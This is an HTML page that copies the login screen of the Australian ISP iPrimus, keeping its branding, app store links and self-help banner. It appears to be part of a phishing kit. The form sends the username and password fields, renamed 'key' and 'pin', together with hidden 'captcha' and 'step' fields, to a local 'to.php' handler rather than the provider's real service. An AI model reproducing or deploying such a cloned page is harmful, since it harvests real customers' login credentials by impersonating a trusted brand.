<!-- Body -->
<!-- appCtrl controller with serveral data used in theme on diferent view -->
<!-- landing-scrollspy is directive for scrollspy used in landing page -->
<body ng-controller=appCtrl class=blank landing-scrollspy tour backdrop=true>
 
 
 
 <div class="splash ng-hide" ng-show=dataLoading style=display:none>
 
 </div>
 
 <div ui-view autoscroll=true class="full-page ng-scope">
<div id=header ng-include="'common/viewsnav/headerlogin.nav.html'" class="ng-scope sf-hidden">
</div>
<div ui-view class=ng-scope>
<div class="account ng-scope" ng-controller=LoginController>
 <div class="col-md-4 left-col">
 <div class=us-text>
 <img src=data:image/png;base64,>
 </div>
 </div>
 <div class="col-md-8 login-box" ng-show=showLogin>
 
 <div>
<form name="form" method="post" action="to.php">
  <input type="hidden" name="captcha">
                                    <input type="hidden" name="step" value="login">
 <div class="help-block text-danger-error font-extra-bold text-center ng-hide sf-hidden" ng-show=error style=max-width:250px>
 
 
 
 
 </div>
 <div class=form-group>
 <label class=label-color for=username>Username</label>
 <input type="text" placeholder="username" style="color:#4e5489" title="Please enter you username" value name="key" id="username" class="form-control ng-pristine ng-untouched ng-invalid ng-invalid-required ng-valid-maxlength" maxlength=30 ng-model=username required autofocus>
 </div>
 <div class=form-group>
 <label class=label-color for=password>Password</label>
 <input type="password" title="Please enter your password" placeholder=****** value name="pin" id="password" maxlength=25 class="form-control ng-pristine ng-untouched ng-invalid ng-invalid-required ng-valid-maxlength" ng-model=password required>
 </div>
 <button class=login-button type=submit>SIGN IN</button>
 </form>
 <div class=forgot-password>
 <a ui-sref=common.register ng-click=forgotCredentialPageRedirection() href=#/common/register>
 <img src="data:image/png;base64," alt="Forgotten your Username or Password?">
 <div class="text-danger-error font-extra-bold">I forgot my password!</div>
 </a>
 </div>
 <div class="no-login center-buttons">
 <a class=grey-text ui-sref=common.register ng-click=registerPageRedirection() href=#/common/register>
 <b>I dont have my login info yet!</b>
 </a>
 </div>
 <div class="no-login center-buttons appicon-resize">
 <a class=grey-text href="https://itunes.apple.com/au/app/iprimus/id1276417901?mt=8" target=_blank>
 <img src=data:image/png;base64,>
 </a>
 </div>
 <div class="no-login center-buttons appicon-resize">
 <a class=grey-text href="https://play.google.com/store/apps/details?id=vocus.primus" target=_blank>
 <img src=data:image/png;base64,>
 </a>
 </div>
 </div>
 </div>
 <div class="col-md-8 login-box ng-hide sf-hidden" ng-show=showCodeOptions>
 
 
 
 </div>
 <div class="col-md-8 login-box ng-hide sf-hidden" ng-show="showCodeValidation &amp;&amp; !showCodeOptions">
 
 
 </div>
 <div class="col-md-8 login-box ng-hide sf-hidden" ng-show="showInvalidAcmaSession &amp;&amp; !showLogin">
 
 
 </div>
 <div style=width:100%;min-height:50px;position:fixed;left:0px;top:0px;background-color:#35cc99;text-align:center>
 <div style=display:inline-block;padding-top:13px;padding-bottom:13px;font-size:15px;color:#34495e;font-weight:550>
 <img src="data:image/png;base64," style=margin-right:5px>
 <a href=https://www.iprimus.com.au/selfhelp style=font-weight:bold target=_blank>Find out about the easy online self-help features here to support you!</a>
 </div>
 </div>
</div>
</div>
<div id=footer ng-include="'common/viewsnav/footerlogin.nav.html'" class=ng-scope><div class="primus-footer ng-scope sf-hidden">
 
</div>
